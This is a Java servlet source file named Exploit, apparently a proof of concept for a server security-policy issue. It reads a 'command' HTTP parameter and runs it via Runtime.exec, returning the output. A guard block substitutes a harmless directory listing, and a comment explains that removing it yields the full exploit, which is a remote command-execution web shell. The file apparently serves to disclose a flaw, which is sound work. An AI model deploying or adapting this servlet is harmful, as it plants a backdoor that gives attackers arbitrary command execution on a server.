/*
 * Created 20-Jan-2012
 * 
 * This file is public domain.
 */
package org.netbeans.issue181080;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import java.util.logging.Logger;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * @author Samuel Halliday
 */
@WebServlet(name = "Exploit", urlPatterns = {"/exploit"})
@SuppressWarnings("serial")
public class Exploit extends HttpServlet {

	private static final Logger log = Logger.getLogger(Exploit.class.getName());

	// adapted from http://www.javaworld.com/javaworld/jw-12-2000/jw-1229-traps.html
	private static class Gobbler implements Callable<String> {

		private final InputStream is;

		Gobbler(InputStream is) {
			this.is = is;
		}

		@Override
		public String call() {
			StringBuilder builder = new StringBuilder();
			try {
				InputStreamReader reader = new InputStreamReader(is);
				BufferedReader br = new BufferedReader(reader);
				String line;
				while ((line = br.readLine()) != null) {
					builder.append(line);
					builder.append("\n");
				}
			} catch (IOException e) {
				log.warning("IOException: " + e.getMessage());
			}
			return builder.toString();
		}
	}

	@Override
	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String command = request.getParameter("command");

		// REMOVE THIS BLOCK TO GET THE FULL EXPLOIT
		if (System.getProperty("os.name").toLowerCase().contains("win")) {
			command = "cmd /C dir";
		} else {
			command = "/bin/ls /";
		}

		log.info("RUNNING: " + command);

		String stdout = "(empty)";
		String stderr;
		try {
			// SHOCKINGLY exec is allowed by the default server.policy
			Process process = Runtime.getRuntime().exec(command);
			Gobbler stdoutGobbler = new Gobbler(process.getInputStream());
			Gobbler stderrGobbler = new Gobbler(process.getErrorStream());

			ExecutorService pool = Executors.newFixedThreadPool(2);
			Future<String> stdoutFuture = pool.submit(stdoutGobbler);
			Future<String> stderrFuture = pool.submit(stderrGobbler);

			stdout = stdoutFuture.get();
			stderr = stderrFuture.get();
		} catch (Exception e) {
			stderr = e.getMessage();
		}

		request.setAttribute("command", command);
		request.setAttribute("stdout", stdout);
		request.setAttribute("stderr", stderr);
	}
}
